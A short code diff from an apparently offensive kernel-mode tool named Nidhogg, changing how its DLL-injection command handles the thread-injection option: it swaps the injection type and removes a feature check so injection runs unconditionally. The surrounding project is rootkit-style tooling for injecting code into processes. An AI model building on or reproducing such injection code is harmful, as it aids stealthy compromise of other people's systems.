@@ -55,13 +55,7 @@ NTSTATUS DllInjectionParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	}
 	case Options::Thread:
 	{
-		dllInfo.Type = InjectionType::NtCreateThreadExInjection;
-
-		if (!Features.CreateThreadInjection) {
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
-
+		dllInfo.Type = InjectionType::CreateThreadInjection;
 		status = NidhoggMemoryHandler->InjectDllThread(dllInfo);
 		break;
 	}
